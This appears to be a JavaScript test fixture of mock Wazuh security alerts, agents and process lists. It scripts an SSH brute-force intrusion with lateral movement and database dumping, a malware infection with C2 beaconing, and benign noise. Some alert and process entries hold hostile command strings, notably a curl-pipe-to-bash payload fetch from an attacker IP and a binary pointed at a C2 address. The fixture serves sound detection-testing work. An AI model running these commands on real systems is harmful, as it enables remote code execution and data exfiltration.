'use strict';

const now = Date.now();
const ts = (offsetMinutes) => new Date(now - offsetMinutes * 60 * 1000).toISOString();

// ─── Agents ───────────────────────────────────────────────────────────────────

const AGENTS = [
  { id: '001', name: 'prod-web-01',    ip: '10.0.1.10',   status: 'active', os: { platform: 'ubuntu', version: '22.04' } },
  { id: '002', name: 'prod-db-01',     ip: '10.0.1.20',   status: 'active', os: { platform: 'ubuntu', version: '22.04' } },
  { id: '003', name: 'dev-staging-01', ip: '10.100.0.5',  status: 'active', os: { platform: 'ubuntu', version: '20.04' } },
  { id: '004', name: 'prod-app-01',    ip: '10.0.10.15',  status: 'active', os: { platform: 'ubuntu', version: '22.04' } },
  { id: '005', name: 'dc-win-01',      ip: '10.0.2.10',   status: 'active', os: { platform: 'windows', version: 'Server 2019' } },
];

// ─── Scenario 1: SSH Brute Force → Login → Lateral Movement → Exfiltration ───
// 47 auth failures + 1 success + payload exec + lateral SSH + pg_dump

const bruteForceAlerts = Array.from({ length: 47 }, (_, i) => ({
  id: `alert-bf-${String(i + 1).padStart(3, '0')}`,
  timestamp: ts(240 - i * 4),
  rule: {
    id: '5710',
    level: 10,
    description: 'Multiple authentication failures',
    groups: ['syslog', 'sshd', 'authentication_failures'],
  },
  agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
  data: {
    srcip: '203.0.113.44',
    dstuser: ['admin', 'root', 'deploy'][i % 3],
    program_name: 'sshd',
  },
  full_log: `sshd[${12000 + i}]: Failed password for ${['admin', 'root', 'deploy'][i % 3]} from 203.0.113.44 port ${40000 + i} ssh2`,
}));

const intrusion = [
  // Successful login after brute force
  {
    id: 'alert-bf-048',
    timestamp: ts(180),
    rule: { id: '5715', level: 8, description: 'Authentication success', groups: ['syslog', 'sshd', 'authentication_success'] },
    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
    data: { srcip: '203.0.113.44', dstuser: 'deploy', program_name: 'sshd' },
    full_log: 'sshd[12050]: Accepted password for deploy from 203.0.113.44 port 41000 ssh2',
  },
  // Payload download and execution
  {
    id: 'alert-bf-049',
    timestamp: ts(178),
    rule: { id: '87105', level: 13, description: 'Possible shell script download and execution', groups: ['syslog', 'ossec'] },
    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
    data: { srcip: '203.0.113.44', command: 'curl http://203.0.113.44:8080/payload.sh | bash', dstuser: 'deploy' },
    full_log: 'bash[13000]: curl http://203.0.113.44:8080/payload.sh | bash',
  },
  // Lateral movement — SSH from prod-web-01 to prod-db-01
  {
    id: 'alert-bf-050',
    timestamp: ts(170),
    rule: { id: '5715', level: 8, description: 'Authentication success', groups: ['syslog', 'sshd', 'authentication_success'] },
    agent: { id: '002', name: 'prod-db-01', ip: '10.0.1.20' },
    data: { srcip: '10.0.1.10', dstuser: 'dbadmin', program_name: 'sshd' },
    full_log: 'sshd[14000]: Accepted publickey for dbadmin from 10.0.1.10 port 52000 ssh2',
  },
  // Data exfiltration — pg_dump
  {
    id: 'alert-bf-051',
    timestamp: ts(165),
    rule: { id: '100002', level: 13, description: 'Sensitive data exfiltration detected', groups: ['syslog', 'ossec', 'exfiltration'] },
    agent: { id: '002', name: 'prod-db-01', ip: '10.0.1.20' },
    data: { command: 'pg_dump --all-databases > /tmp/dump.sql', dstuser: 'dbadmin' },
    full_log: 'bash[15000]: pg_dump --all-databases > /tmp/dump.sql',
  },
];

// ─── Scenario 2: Malware on prod-app-01 ───────────────────────────────────────
// Hidden binary + cron persistence + C2 beaconing

const malware = [
  {
    id: 'alert-mal-001',
    timestamp: ts(120),
    rule: { id: '87106', level: 12, description: 'Malware detected — suspicious binary execution', groups: ['syscheck', 'malware'] },
    agent: { id: '004', name: 'prod-app-01', ip: '10.0.10.15' },
    data: { file: '/tmp/.hidden_bin', command: '/tmp/.hidden_bin -c2 198.51.100.22:4444', dstuser: 'www-data' },
    full_log: 'ossec: Integrity checksum changed for /tmp/.hidden_bin',
  },
  {
    id: 'alert-mal-002',
    timestamp: ts(118),
    rule: { id: '5903', level: 11, description: 'Crontab file modified — possible persistence', groups: ['syscheck', 'persistence'] },
    agent: { id: '004', name: 'prod-app-01', ip: '10.0.10.15' },
    data: { file: '/etc/cron.d/sysupdate', dstuser: 'www-data' },
    full_log: 'ossec: /etc/cron.d/sysupdate was modified',
  },
  {
    id: 'alert-mal-003',
    timestamp: ts(115),
    rule: { id: '92000', level: 12, description: 'Outbound connection to suspicious IP', groups: ['firewall', 'c2'] },
    agent: { id: '004', name: 'prod-app-01', ip: '10.0.10.15' },
    data: { srcip: '10.0.10.15', dstip: '198.51.100.22', dstport: '4444', protocol: 'tcp' },
    full_log: 'iptables: OUTBOUND src=10.0.10.15 dst=198.51.100.22:4444 ESTABLISHED',
  },
  {
    id: 'alert-mal-004',
    timestamp: ts(110),
    rule: { id: '92100', level: 10, description: 'Repeated outbound connections to same external host', groups: ['firewall', 'c2'] },
    agent: { id: '004', name: 'prod-app-01', ip: '10.0.10.15' },
    data: { srcip: '10.0.10.15', dstip: '198.51.100.22', count: '12' },
    full_log: 'iptables: 12 connections to 198.51.100.22:4444 in 5 minutes',
  },
];

// ─── Scenario 3: Low-noise routine alerts on dev-staging-01 ───────────────────

const noise = [
  {
    id: 'alert-noise-001',
    timestamp: ts(60),
    rule: { id: '5706', level: 3, description: 'SSH preauthentication failed', groups: ['syslog', 'sshd'] },
    agent: { id: '003', name: 'dev-staging-01', ip: '10.100.0.5' },
    data: { srcip: '185.220.101.1' },
    full_log: 'sshd[99]: Connection closed by 185.220.101.1 port 54321 [preauth]',
  },
  {
    id: 'alert-noise-002',
    timestamp: ts(45),
    rule: { id: '2502', level: 2, description: 'User missed the password more than one time', groups: ['pam'] },
    agent: { id: '003', name: 'dev-staging-01', ip: '10.100.0.5' },
    data: { dstuser: 'jenkins', program_name: 'pam_unix' },
    full_log: 'pam_unix: authentication failure; user=jenkins',
  },
  {
    id: 'alert-noise-003',
    timestamp: ts(30),
    rule: { id: '5101', level: 3, description: 'Firewall connection dropped', groups: ['firewall'] },
    agent: { id: '003', name: 'dev-staging-01', ip: '10.100.0.5' },
    data: { srcip: '1.2.3.4', dstport: '22' },
    full_log: 'iptables: DROPPED src=1.2.3.4 dst=10.100.0.5:22',
  },
];

const ALERTS = [...bruteForceAlerts, ...intrusion, ...malware, ...noise];

// ─── Processes per agent ──────────────────────────────────────────────────────

const PROCESSES = {
  '001': [ // prod-web-01
    { pid: 1, name: 'systemd', cmd: '/sbin/init', user: 'root' },
    { pid: 450, name: 'sshd', cmd: '/usr/sbin/sshd -D', user: 'root' },
    { pid: 600, name: 'wazuh-agent', cmd: '/var/ossec/bin/wazuh-agent', user: 'root' },
    { pid: 13000, name: 'bash', cmd: 'curl http://203.0.113.44:8080/payload.sh | bash', user: 'deploy' },
  ],
  '002': [ // prod-db-01
    { pid: 1, name: 'systemd', cmd: '/sbin/init', user: 'root' },
    { pid: 300, name: 'postgres', cmd: 'postgres: checkpointer', user: 'postgres' },
    { pid: 600, name: 'wazuh-agent', cmd: '/var/ossec/bin/wazuh-agent', user: 'root' },
    { pid: 15000, name: 'bash', cmd: 'pg_dump --all-databases > /tmp/dump.sql', user: 'dbadmin' },
  ],
  '003': [ // dev-staging-01
    { pid: 1, name: 'systemd', cmd: '/sbin/init', user: 'root' },
    { pid: 400, name: 'jenkins', cmd: 'java -jar jenkins.war', user: 'jenkins' },
    { pid: 600, name: 'wazuh-agent', cmd: '/var/ossec/bin/wazuh-agent', user: 'root' },
  ],
  '004': [ // prod-app-01 — has the malicious process
    { pid: 1, name: 'systemd', cmd: '/sbin/init', user: 'root' },
    { pid: 500, name: 'node', cmd: 'node /app/server.js', user: 'www-data' },
    { pid: 600, name: 'wazuh-agent', cmd: '/var/ossec/bin/wazuh-agent', user: 'root' },
    { pid: 9999, name: '.hidden_bin', cmd: '/tmp/.hidden_bin -c2 198.51.100.22:4444', user: 'www-data' },
  ],
  '005': [ // dc-win-01
    { pid: 4, name: 'System', cmd: 'System', user: 'SYSTEM' },
    { pid: 900, name: 'lsass.exe', cmd: 'C:\\Windows\\System32\\lsass.exe', user: 'SYSTEM' },
  ],
};

module.exports = { ALERTS, AGENTS, PROCESSES };
